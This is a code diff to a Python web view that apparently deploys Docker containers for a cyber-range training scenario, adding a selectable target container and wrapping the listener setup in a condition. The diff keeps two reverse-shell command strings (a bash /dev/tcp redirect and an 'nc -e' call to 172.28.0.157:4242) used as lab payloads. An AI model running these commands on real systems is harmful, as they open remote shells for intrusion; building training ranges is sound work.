@@ -272,6 +272,8 @@ def environmentView(request):
 
             target_os = request.POST["target_os"]
 
+            selected_target = request.POST["selected_target"].replace("/","_").lower()
+
             filebeats = False
             packetbeats = False
             suricata = False
@@ -360,19 +362,21 @@ def environmentView(request):
 
             print("Deployment in Progress")
 
-            deploy_containers(current_scenario, ["uwe_tek_external", "uwe_tek_internal"],dynamic_containers_sect, pcap, replace_subnet_dict=None, user_defined=False)
+            deploy_containers(current_scenario, ["uwe_tek_external", "uwe_tek_internal"],dynamic_containers_sect, pcap, selected_target, replace_subnet_dict=None, user_defined=False)
 
-            listen_cmd = "/bin/bash -i >& /dev/tcp/172.28.0.157/4242 0>&1"
+            if selected_target == "default":
 
-            if target_os == "alpine":
-                listen_cmd = "nc 172.28.0.157 4242 -e /bin/ash"
+                listen_cmd = "/bin/bash -i >& /dev/tcp/172.28.0.157/4242 0>&1"
 
-            if current_scenario.listen_process_pid == 0:
-                listen_process = mp.Process(target=listen,args=("0.0.0.0",18200,listen_cmd,target_os, "goibhniuwe_target_1" ))
+                if target_os == "alpine":
+                    listen_cmd = "nc 172.28.0.157 4242 -e /bin/ash"
 
-                listen_process.start()
+                if current_scenario.listen_process_pid == 0:
+                    listen_process = mp.Process(target=listen,args=("0.0.0.0",18200,listen_cmd,target_os, "goibhniuwe_target_1" ))
 
-                current_scenario.listen_process_pid = listen_process.pid
+                    listen_process.start()
+
+                    current_scenario.listen_process_pid = listen_process.pid
 
             containers_objects = docker_client.containers.list()
             running_containers = [x.name for x in containers_objects]
@@ -401,7 +405,7 @@ def environmentView(request):
                             flag_dict[container_name] = flag
                             break;
 
-                if container_name.__contains__("target"):
+                if container_name.__contains__(selected_target):
 
                     container_pid = subprocess.check_output(["docker", "inspect", "--format", "{{.State.Pid}}", container_name], text=True).strip()
 
@@ -930,7 +934,7 @@ def service_check(address):
     return
 
 
-def deploy_containers(scenario, required_networks, dynamic_containers_sect, pcap, replace_subnet_dict, user_defined):
+def deploy_containers(scenario, required_networks, dynamic_containers_sect, pcap, selected_target, replace_subnet_dict, user_defined):
 
     custom_dc_services = dict()
 
@@ -972,6 +976,12 @@ def deploy_containers(scenario, required_networks, dynamic_containers_sect, pcap
         dcf_data = yaml.safe_load(dcf)
 
     for service in custom_dc_services:
+        if service.__contains__(selected_target):
+            ipv4_addr = custom_dc_services[service]["networks"]["external"]["ipv4_address"]
+            custom_dc_services[service]["networks"]["internal"] = {"ipv4_address":ipv4_addr.replace("28","29")}
+
+            dcf_data["services"].pop("target")
+
         dcf_data["services"][service] = custom_dc_services[service]
 
     for service in dcf_data["services"]:
